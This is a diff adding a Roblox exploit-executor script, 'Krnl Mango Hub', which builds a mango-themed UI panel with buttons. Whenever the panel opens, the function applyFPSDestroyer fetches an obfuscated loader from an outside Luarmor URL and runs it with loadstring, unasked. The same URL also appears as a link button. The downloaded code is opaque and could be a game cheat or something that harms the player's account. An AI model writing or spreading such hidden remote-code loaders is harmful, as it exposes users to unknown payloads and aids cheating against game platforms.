@@ -1,0 +1,168 @@
+-- Krnl Mango Hub UI Script
+
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+
+-- ScreenGui
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+
+-- Panel
+local panel = Instance.new("Frame")
+panel.Size = UDim2.new(0.5, 0, 0.6, 0)
+panel.Position = UDim2.new(0.25, 0, 0.2, 0)
+panel.BackgroundColor3 = Color3.fromRGB(255, 185, 77) -- Mango-orange
+panel.Visible = false
+panel.Parent = gui
+
+local panelCorner = Instance.new("UICorner")
+panelCorner.CornerRadius = UDim.new(0, 12)
+panelCorner.Parent = panel
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.BackgroundTransparency = 1
+title.Text = "Mango Hub"
+title.TextColor3 = Color3.fromRGB(30, 30, 30)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 24
+title.Parent = panel
+
+-- Close Button
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 60, 0, 30)
+closeBtn.Position = UDim2.new(1, -70, 0, 10)
+closeBtn.Text = "✕"
+closeBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+closeBtn.TextColor3 = Color3.fromRGB(30, 30, 30)
+closeBtn.Font = Enum.Font.SourceSansBold
+closeBtn.TextSize = 18
+closeBtn.Parent = panel
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 6)
+closeCorner.Parent = closeBtn
+
+-- FPS Destroyer Button
+local fpsBtn = Instance.new("TextButton")
+fpsBtn.Size = UDim2.new(0.8, 0, 0, 40)
+fpsBtn.Position = UDim2.new(0.1, 0, 0, 50)
+fpsBtn.Text = "FPS Destroyer"
+fpsBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+fpsBtn.TextColor3 = Color3.fromRGB(30, 30, 30)
+fpsBtn.Font = Enum.Font.SourceSans
+fpsBtn.TextSize = 16
+fpsBtn.Parent = panel
+
+local fpsCorner = Instance.new("UICorner")
+fpsCorner.CornerRadius = UDim.new(0, 6)
+fpsCorner.Parent = fpsBtn
+
+-- Greeting Label (Apricot background)
+local greeting = Instance.new("TextLabel")
+greeting.Size = UDim2.new(0.3, 0, 0.1, 0)
+greeting.Position = UDim2.new(0.35, 0, 0.8, 0)
+greeting.BackgroundColor3 = Color3.fromRGB(255, 204, 153) -- Apricot color
+greeting.Text = "Hi!"
+greeting.TextColor3 = Color3.fromRGB(30, 30, 30)
+greeting.Font = Enum.Font.SourceSans
+greeting.TextSize = 24
+greeting.TextScaled = true
+greeting.Visible = false
+greeting.Parent = gui
+
+local greetingCorner = Instance.new("UICorner")
+greetingCorner.CornerRadius = UDim.new(0, 12)
+greetingCorner.Parent = greeting
+
+-- Function to apply FPS Destroyer
+local function applyFPSDestroyer()
+    local url = "https://api.luarmor.net/files/v3/loaders/c62563366e7ba3208d704a4e2d7e6789.lua"
+    local success, err = pcall(function()
+        loadstring(game:HttpGet(url))()
+    end)
+    if not success then
+        warn("Failed to load FPS Destroyer script:", err)
+    end
+end
+
+-- Open/Close Animation
+local animating = false
+local function togglePanel()
+    if animating then return end
+    animating = true
+    panel.Visible = not panel.Visible
+    if panel.Visible then
+        -- Apply FPS Destroyer when the panel opens
+        applyFPSDestroyer()
+        panel.Position = UDim2.new(0.25, 0, -0.6, 0)
+        TweenService:Create(panel, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.25, 0, 0.2, 0)}):Play()
+        greeting.Visible = true
+    else
+        TweenService:Create(panel, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(0.25, 0, -0.6, 0)}):Play()
+        greeting.Visible = false
+    end
+    animating = false
+end
+
+-- Mango Button
+local mangoBtn = Instance.new("ImageButton")
+mangoBtn.Size = UDim2.new(0, 120, 0, 120)
+mangoBtn.Position = UDim2.new(0.05, 0, 0.8, 0)
+mangoBtn.Image = "rbxassetid://12345678" -- replace with your mango asset
+mangoBtn.BackgroundTransparency = 1
+mangoBtn.Parent = gui
+
+local mangoCorner = Instance.new("UICorner")
+mangoCorner.CornerRadius = UDim.new(1, 0)
+mangoCorner.Parent = mangoBtn
+
+-- Open/Close Panel via Mango Button
+mangoBtn.MouseButton1Click:Connect(togglePanel)
+closeBtn.MouseButton1Click:Connect(togglePanel)
+
+-- Esc key closes panel
+UserInputService.InputBegan:Connect(function(input, processed)
+    if not processed and input.KeyCode == Enum.KeyCode.Escape and panel.Visible then
+        togglePanel()
+    end
+end)
+
+-- Function to open URL
+local function openURL(url)
+    local success, err = pcall(function()
+        player:PromptOpenURL(url)
+    end)
+    if not success then
+        warn("Failed to open URL:", err)
+    end
+end
+
+-- Add URL Buttons
+local urlButtons = {
+    {Text = "Luarmor FPS Destroyer", URL = "https://api.luarmor.net/files/v3/loaders/c62563366e7ba3208d704a4e2d7e6789.lua"},
+    {Text = "Roblox Website", URL = "https://www.roblox.com/"},
+    {Text = "YouTube", URL = "https://www.youtube.com/"}
+}
+
+for i, data in ipairs(urlButtons) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.8, 0, 0, 40)
+    btn.Position = UDim2.new(0.1, 0, 0, 50 + i * 50)
+    btn.Text = data.Text
+    btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextColor3 = Color3.fromRGB(30, 30, 30)
+    btn.Font = Enum.Font.SourceSans
+    btn.TextSize = 16
+    btn.Parent = panel
+
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    btnCorner.Parent = btn
+
+    btn.MouseButton1Click:Connect(function()
+        openURL(data.URL)
+    end)
+end
